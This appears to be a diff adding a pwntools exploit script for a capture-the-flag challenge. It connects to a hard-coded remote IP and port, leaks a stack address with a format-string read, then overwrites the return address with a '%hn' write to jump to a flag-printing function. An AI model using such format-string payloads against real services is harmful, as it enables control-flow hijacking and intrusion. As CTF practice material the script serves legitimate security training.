@@ -1,0 +1,49 @@
+#!/usr/bin/env python3
+from pwn import *
+
+# 連接遠端伺服器
+io = remote('140.113.207.245', 30175)  # 替換為伺服器的 IP 和埠號
+
+putFlag_addr_val = 0x401256
+offset = 0x30E
+low_16 = 0x1256
+
+# 讀取 rbp
+io.recvuntil(b'> ')
+io.sendline(b'%10$p')
+rbp = int(io.recvline_contains(b'You entered: ').strip().split(b': ')[1], 16)
+log.info(f'rbp = {hex(rbp)}')
+
+# 計算地址
+ret_addr = rbp + 8
+
+log.info(f'ret_addr = {hex(ret_addr)}')
+
+io.recvuntil(b'> ')
+
+payload = b'AAA%13$p'  # 只放兩個地址
+payload += p64(ret_addr)  # 只放一個地址
+io.sendline(payload)
+response = io.recvline().strip()
+print(f"Response: {response}")
+
+sleep(0.5)  # 等待程式處理輸入
+
+io.recvuntil(b'> ')
+# 將地址手動轉換為位元組（小端序）
+ret_addr_bytes = ret_addr.to_bytes(8, 'little')
+
+# 放兩個地址（ret_addr, ret_addr+2）在payload最前面，分別對應 %12$n
+payload = b'AAAA' + f"%{low_16 - 4}c%14$hn".encode() + p64(ret_addr)  # 放兩個地址
+
+io.sendline(payload)
+
+response = io.recvall(timeout=3).decode(errors='ignore')
+# print("Full Response:\n", response)
+
+for line in response.splitlines():
+    if "CSC2025" in line:
+        start_index = line.find("CSC2025")
+        print("FLAG:", line[start_index:])
+
+io.close()
